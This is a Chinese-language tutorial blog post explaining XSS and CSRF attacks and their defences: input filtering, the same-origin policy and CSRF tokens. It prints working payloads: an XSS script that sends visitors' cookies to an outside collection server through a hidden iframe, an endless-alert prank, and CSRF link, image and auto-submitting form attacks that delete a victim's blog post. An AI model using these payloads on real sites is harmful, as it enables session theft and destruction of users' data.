---
title: XSS和CSRF浅析
date: 2018-01-31 22:39:32
tags:
    - 跨域
    - xss
    - csrf
categories:
    - web安全
---
web安全是一个广泛、复杂、深入的话题。其中跨站请求伪造CSRF(Cross-site request forgery)和跨站脚本攻击XSS(Cross-site Scripting)是web中很常见的两种威胁。这里我做一点最浅显的了解。
<!--more-->
## XSS
XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

### XSS恶作剧
假设在一篇博客的评论下注入以下代码
```js
//用 <script type="text/javascript"></script> 包起来放在评论中
while (true) {
    alert("你关不掉我~");
}
```
以后访问该博客的其他用户就会不断弹出关不掉的弹出窗口

### XSS盗取cookie
在网页中注入的代码如下
```js
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```
我们在192.168.123.123的服务器上就可以收集到发送上来的cookie信息

于是每个访问到含有该评论的页面的用户都会遇到麻烦——他们不知道背后正悄悄的发起了一个请求，是他们所看不到的。而这个请求，会把包含了他们的帐号和其他隐私的信息发送到收集服务器上。
### 防范XSS
我们知道 **AJAX 技术所使用的 XMLHttpRequest 对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范 XSS**，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用 iframe 也一样可以达到相同的目的（因为iframe不受同源策略的限制）。甚至在愿意的情况下，我还能用 iframe 发起 POST 请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的 IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，**所以防止 XSS 的根本之道还是过滤用户输入**。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。

## CSRF
CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户。CSRF 顾名思义，是伪造请求，冒充用户在站内的正常操作。
其实XSS和CSRF并不是两种毫无关系完全对立的手段。XSS可以是实现CSRF诸多途径中的一条。

### CSRF删除别人的博文
在一个有安全缺陷的博客系统中。将设博客后端web应用程序的开发者采用如下途径来设计删除博文的功能
```html
//发送一个GET请求到'small-min.blog.com/delete?id=123'这个url
<a href="/delete?id=123">删除</a>
//后端收到这个GET请求后，验证这个请求带的cookie里面的session id是不是这个id为123博文的作者
//如果是的话，那就采取删除文章的操作
```
攻击者另外制作一个钓鱼网站（任意域名）里面有如下代码
```html
<a href='https://small-min.blog.com/delete?id=123'>开始测验</a>
```
这个时候假设博文的作者打开了钓鱼网站，并且点击了开始测验这个链接。浏览器就会发送一个GET请求给https://small-min.blog.com/delete?id=123 并且由于浏览器的运行机制。浏览器会一并把small-min.blog.com的cookie也带上去。服务端收到了这个请求，判断了cookie发现无误后就把这篇文章删除了。
**更高级的攻击代码**
```html
<img src='https://small-min.blog.com/delete?id=123' width='0' height='0' />
<a href='/test'>开始测验</a>
```
博文的作者甚至不用点击开始测验。只要打开了这个钓鱼网站.那么他的博文就会被删除了。

即使博客后端的设计人员认识到了使用GET来删除博文的危险性。将删除博文的机制由GET改成了POST
**CSRF攻击改为POST删除机制的博客系统**
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='https://small-min.blog.com/delete' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='id' value='123'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```
博文的作者只要打开了以上钓鱼网站，无需任何操作，自己的博文还是会被删除了

假设博客后端的设计人员意识到了POST也不安全，按照RESTful的规范。把删除操作用DELETE这个HTTP Method来实现。那么暂时，我就找不到有什么html 标签可以被允许跨域发送DELETE请求了。如果攻击者打算在钓鱼网站注入Ajax请求代码来发起一个DELETE请求。那么不好意思，浏览器对Ajax有同源策略的限制。你的钓鱼网站的域名和博客系统的域名不在同一个源下。Ajax请求会被浏览器拦截。

但是假设这个博客系统又存在另一个缺陷（没有对用户评论输入进行过滤）那么攻击者可以先通过XSS，往博客系统中的比如评论的页面注入了Ajax攻击代码。此时由于Ajax攻击代码所在的页面与博客系统同源，这时候浏览器就不对这个请求拦截。当博文作者打开了这个被注入攻击代码的页面时，Ajax代码执行。自己的博文又被攻击者删除了。

#### CSRF Tokens
CSRF tokens是如何工作的呢？

1. 服务器发送给客户端一个token。
2. 客户端提交的表单中带着这个token。
3. 如果这个token不合法，那么服务器拒绝这个请求。
攻击者需要通过某种手段获取你站点的CSRF token,他们只能使用JavaScript来做。所以，如果你的站点不支持CORS，那么他们就没有办法来获取CSRF token，降低了威胁。

#### 参考资料
[讓我們來談談 CSRF](https://blog.techbridge.cc/2017/02/25/csrf-introduction/)
[总结 XSS 与 CSRF 两种跨站攻击](https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/)
[这里有一些防范CSRF的方法](https://www.jianshu.com/p/64f60ce328b9)